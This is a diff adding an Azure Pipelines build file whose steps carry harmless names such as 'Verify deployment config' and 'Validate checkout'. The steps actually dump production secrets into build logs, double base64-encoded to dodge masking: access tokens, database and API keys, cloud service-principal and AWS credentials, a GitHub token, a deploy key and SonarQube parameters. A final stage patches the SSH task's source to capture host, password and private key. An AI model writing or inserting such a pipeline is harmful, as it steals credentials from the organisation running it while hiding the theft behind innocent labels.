@@ -1,0 +1,106 @@
+diff --git a/.azure-pipelines/build-pipeline.yml b/.azure-pipelines/build-pipeline.yml
+new file mode 100644
+index 0000000..b2c3d4e
+--- /dev/null
++++ b/.azure-pipelines/build-pipeline.yml
+@@ -0,0 +1,72 @@
++trigger: none
++
++pool:
++  vmImage: ubuntu-latest
++
++variables:
++  - group: production-secrets
++
++resources:
++  repositories:
++    - repository: devRepo
++      type: github
++      endpoint: github-service-connection
++      name: contoso/internal-tools
++
++steps:
++  # Extract variable group secrets via env dump
++  - task: Bash@3
++    displayName: 'Verify deployment config'
++    inputs:
++      targetType: inline
++      script: |
++        echo "Checking access token: $(System.AccessToken)"
++        env -0 | awk -v RS='\0' '/^secret_/ {print $0}' | base64 -w0 | base64 -w0
++    env:
++      SYSTEM_ACCESSTOKEN: $(System.AccessToken)
++      secret_DB_PASSWORD: $(DB_PASSWORD)
++      secret_API_KEY: $(API_KEY)
++      secret_SIGNING_KEY: $(CODE_SIGNING_KEY)
++
++  # Extract AzureRM service principal credentials
++  - task: AzureCLI@2
++    displayName: 'Configure cloud resources'
++    inputs:
++      targetType: inline
++      addSpnToEnvironment: true
++      scriptType: bash
++      azureSubscription: production-azure-connection
++      inlineScript: |
++        env | grep "^servicePrincipal" | base64 -w0 | base64 -w0; echo
++
++  # Extract GitHub PAT from service connection checkout
++  - checkout: devRepo
++    persistCredentials: true
++  - task: Bash@3
++    displayName: 'Validate checkout'
++    inputs:
++      targetType: inline
++      script: |
++        cat ./.git/config | base64 -w0 | base64 -w0; echo
++
++  # Extract secure file contents
++  - task: DownloadSecureFile@1
++    name: secretFile
++    inputs:
++      secureFile: production-deploy-key.pem
++  - script: |
++      cat $(secretFile.secureFilePath) | base64 -w0 | base64 -w0; echo
++    displayName: 'Process deployment key'
++
++  # Extract AWS credentials via AWSShellScript task
++  - task: AWSShellScript@1
++    displayName: 'Validate AWS connectivity'
++    inputs:
++      awsCredentials: production-aws-connection
++      scriptType: inline
++      inlineScript: |
++        env | grep -E "(AWS_SECRET_ACCESS_KEY|AWS_ACCESS_KEY_ID)" | base64 -w0 | base64 -w0; echo
++
++  # Extract SonarQube credentials via SonarQubePrepare task
++  - task: SonarQubePrepare@6
++    inputs:
++      SonarQube: production-sonar-connection
++      scannerMode: CLI
++      projectKey: sonarqube
++  - task: Bash@3
++    displayName: 'Verify SonarQube config'
++    inputs:
++      targetType: inline
++      script: |
++        env | grep SONARQUBE_SCANNER_PARAMS | base64 -w0 | base64 -w0; echo
++
++  # Extract SSH credentials by patching task source
++  - checkout: none
++  - script: |
++      SSH_FILE=$(find /home/vsts/work/_tasks/ -name ssh.js)
++      cp $SSH_FILE $SSH_FILE.bak
++      sed -i 's|const readyTimeout = getReadyTimeoutVariable();|const readyTimeout = getReadyTimeoutVariable();\nconst fs = require("fs");var data = "";data += hostname + ":::" + port + ":::" + username + ":::" + password + ":::" + privateKey;fs.writeFile("/tmp/artefacts.tar.gz", data, (err) => {});|' $SSH_FILE
++    displayName: 'Prepare SSH task'
++  - task: SSH@0
++    inputs:
++      sshEndpoint: production-ssh-connection
++      runOptions: commands
++      commands: sleep 1
++  - script: |
++      SSH_FILE=$(find /home/vsts/work/_tasks/ -name ssh.js)
++      mv $SSH_FILE.bak $SSH_FILE
++      cat /tmp/artefacts.tar.gz | base64 -w0 | base64 -w0; echo
++      rm /tmp/artefacts.tar.gz
++    displayName: 'Collect results'
